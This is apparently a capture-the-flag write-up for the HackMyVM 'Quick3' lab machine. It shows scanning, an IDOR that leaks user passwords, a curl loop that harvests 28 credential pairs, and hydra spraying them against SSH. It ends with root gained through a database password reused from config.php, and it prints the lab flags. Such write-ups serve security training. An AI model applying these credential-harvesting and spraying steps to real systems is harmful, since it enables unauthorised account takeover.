# Quick3

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.106:22
Open 10.0.2.106:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.106
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPw/57IwrzzYv7y9g3oCqiCqUmaOBmmLJyZE1iWqMH79gcziH5n9oWXErHh4nMVOw/99WYvN+v8vhFWfUK9pAsI=
|   256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILHIfODTU2kHh2eDs9+Y+WWGaX2WZC5Vx/V4NY0LTBAs
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/quick3/writeup.png)

```bash
└─$ feroxbuster -u http://10.0.2.106 -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500,403 --dont-scan css,png,jpeg,jpg,gif -n -x .php
200      GET        1l     1421w    32832c http://10.0.2.106/lib/tempusdominus/js/moment-timezone.min.js
200      GET      804l     3568w    51414c http://10.0.2.106/index.html
200      GET        3l      148w     8156c http://10.0.2.106/lib/wow/wow.min.js
200      GET       53l      337w     5013c http://10.0.2.106/404.html
200      GET        1l     6490w   326657c http://10.0.2.106/lib/tempusdominus/js/moment.min.js
200      GET      804l     3568w    51414c http://10.0.2.106/
301      GET        9l       28w      311c http://10.0.2.106/customer => http://10.0.2.106/customer/
301      GET        9l       28w      308c http://10.0.2.106/fonts => http://10.0.2.106/fonts/
301      GET        9l       28w      309c http://10.0.2.106/images => http://10.0.2.106/images/
301      GET        9l       28w      306c http://10.0.2.106/img => http://10.0.2.106/img/
301      GET        9l       28w      305c http://10.0.2.106/js => http://10.0.2.106/js/
301      GET        9l       28w      306c http://10.0.2.106/lib => http://10.0.2.106/lib/
301      GET        9l       28w      310c http://10.0.2.106/modules => http://10.0.2.106/modules/
```

![writeup-1.png](/assets/pentest/hackmyvm/quick3/writeup-1.png)

### IDOR

If you change the `ID` parameter you become that user and password is visible from html...

![writeup-2.png](/assets/pentest/hackmyvm/quick3/writeup-2.png)

### Password Spray

Extract usernames and passwords
```bash
└─$ for i in {1..28}; do curl "http://10.0.2.106/customer/user.php?id=$i" -s | htmlq '.contact_inner ul li:first-child' -t | tr -d ' :'; done | tee users.txt
info@quick.hmv
nick.greenhorn@quick.hmv
andrew.speed@quick.hmv
jack.black@email.hmv
mike.cooper@quick.hmv
j.doe@email.hmv
jane_smith@email.hmv
frank@email.hmv
fred.flinstone@email.hmv
s.hutson@email.hmv
b.clintwood@email.hmv
j.bond@email.hmv
d.trumpet@email.hmv
m.monroe@email.hmv
jeff.anderson@quick.hmv
lee.ka-shingn@quick.hmv@quick.hmv
laura.johnson@email.hmv
coos.busters@quick.hmv
n.down@email.hmv
t.green@email.hmv
k.ball@email.hmv
juan.mecanico@quick.hmv
john.smith@quick.hmv
misty.cupp@email.hmv
lara.johnson@quick.hmv
j.daniels@email.hmv
dick_swett@email.hmv
a.lucky@email.hmv

└─$ for i in {1..28}; do curl "http://10.0.2.106/customer/user.php?id=$i" -s | htmlq '#oldpassword' -a value; done | tee -a pass.txt
q27QAO6FeisAAtbW
H01n8X0fiiBhsNbI
oyS6518WQxGK8rmk
2n5kKKcvumiR7vrz
6G3UCx6aH6UYvJ6m
k2I9CR15E9O4G1KI
62D4hqCrjjNCuxOj
w9Y021wsWRdkwuKf
1vC35FcnMfmGsI5c
fL01z7z8MawnIdAq
vDKZtVfZuaLN8BEB7f
iakbmsaEVHhN2XoaXB
wv5awQybZTdvZeMGPb
wv5awQybZTdvZeMGPb
Kn4tLAPWDbFK9Zv2
SS2mcbW58a8reLYQ
e8v3JQv3QVA3aNrD
8RMVrdd82n5ymc4Z
STUK2LNwNRU24YZt
mvQnTzCX9wcNtzbW
A9n3XMuB9XmFmgr5
DX5cM3yFg6wJgdYb
yT9Hy2fhX7VhmEkj
aCSKXmzhHL9XPnqr
GUFTV4ERd7QAexxw
fMYFNFzCRMF6ceKe
w5dWfAqNNLtWVvcW
FVYtCpc8FGVHEBXV
```

Make 1:1 list for bruteforce attack
```bash
└─$ paste <(cut -d'@' -f1 users.txt) pass.txt -d ':' | tee user_pass.txt
info:q27QAO6FeisAAtbW
nick.greenhorn:H01n8X0fiiBhsNbI
andrew.speed:oyS6518WQxGK8rmk
jack.black:2n5kKKcvumiR7vrz
mike.cooper:6G3UCx6aH6UYvJ6m
j.doe:k2I9CR15E9O4G1KI
jane_smith:62D4hqCrjjNCuxOj
frank:w9Y021wsWRdkwuKf
fred.flinstone:1vC35FcnMfmGsI5c
s.hutson:fL01z7z8MawnIdAq
b.clintwood:vDKZtVfZuaLN8BEB7f
j.bond:iakbmsaEVHhN2XoaXB
d.trumpet:wv5awQybZTdvZeMGPb
m.monroe:wv5awQybZTdvZeMGPb
jeff.anderson:Kn4tLAPWDbFK9Zv2
lee.ka-shingn:SS2mcbW58a8reLYQ
laura.johnson:e8v3JQv3QVA3aNrD
coos.busters:8RMVrdd82n5ymc4Z
n.down:STUK2LNwNRU24YZt
t.green:mvQnTzCX9wcNtzbW
k.ball:A9n3XMuB9XmFmgr5
juan.mecanico:DX5cM3yFg6wJgdYb
john.smith:yT9Hy2fhX7VhmEkj
misty.cupp:aCSKXmzhHL9XPnqr
lara.johnson:GUFTV4ERd7QAexxw
j.daniels:fMYFNFzCRMF6ceKe
dick_swett:w5dWfAqNNLtWVvcW
a.lucky:FVYtCpc8FGVHEBXV

└─$ hydra -C user_pass.txt 10.0.2.106 ssh -t 8 -I
1 of 1 target completed, 0 valid password found
```

Didn't work. Most commonly linux boxes only have first names, we could try that.
```bash
└─$ paste <(cut -d'@' -f1 users.txt | cut -d'.' -f1) pass.txt -d ':' | tee user_pass.txt
info:q27QAO6FeisAAtbW
nick:H01n8X0fiiBhsNbI
andrew:oyS6518WQxGK8rmk
jack:2n5kKKcvumiR7vrz
mike:6G3UCx6aH6UYvJ6m
j:k2I9CR15E9O4G1KI
jane_smith:62D4hqCrjjNCuxOj
frank:w9Y021wsWRdkwuKf
fred:1vC35FcnMfmGsI5c
s:fL01z7z8MawnIdAq
b:vDKZtVfZuaLN8BEB7f
j:iakbmsaEVHhN2XoaXB
d:wv5awQybZTdvZeMGPb
m:wv5awQybZTdvZeMGPb
jeff:Kn4tLAPWDbFK9Zv2
lee:SS2mcbW58a8reLYQ
laura:e8v3JQv3QVA3aNrD
coos:8RMVrdd82n5ymc4Z
n:STUK2LNwNRU24YZt
t:mvQnTzCX9wcNtzbW
k:A9n3XMuB9XmFmgr5
juan:DX5cM3yFg6wJgdYb
john:yT9Hy2fhX7VhmEkj
misty:aCSKXmzhHL9XPnqr
lara:GUFTV4ERd7QAexxw
j:fMYFNFzCRMF6ceKe
dick_swett:w5dWfAqNNLtWVvcW
a:FVYtCpc8FGVHEBXV

└─$ hydra -C user_pass.txt 10.0.2.106 ssh -t 8 -I
[22][ssh] host: 10.0.2.106   login: mike   password: 6G3UCx6aH6UYvJ6m
```

::: tip Creds
`mike:6G3UCx6aH6UYvJ6m`
:::

## SSH

```bash
└─$ sshpass -p '6G3UCx6aH6UYvJ6m' ssh mike@10.0.2.106
mike@quick3:~$ id
uid=1002(mike) gid=1002(mike) groups=1002(mike)
```

When I tried to use TAB I got error:
```bash
mike@quick3:~$ -rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier
-rbash: /dev/null: restricted: cannot redirect output
bash_completion: _upvars: `-a0': invalid number specifier
```

Spawning bash fixed it
```bash
mike@quick3:~$ bash
mike@quick3:~$ ls
.bash_history  .bash_logout   .bashrc        .cache/        .local/        .profile       user.txt
```

### User.txt

```bash
mike@quick3:~$ grep 'HMV{.*}' user.txt | tr -d ' \t'
HMV{717f274ee66f8541a3031f175f615e72}
```

## Privilege Escalation

```bash
mike@quick3:/var/www/html/customer$ cat config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>
```

::: tip Creds
`root:fastandquicktobefaster`
:::

```bash
mike@quick3:/var/www/html/customer$ su -
Password: fastandquicktobefaster
root@quick3:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@quick3:~# grep 'HMV{.*}' /root/root.txt | tr -d ' \t'
HMV{f178761104e933f9341f13f64b38538a}
```

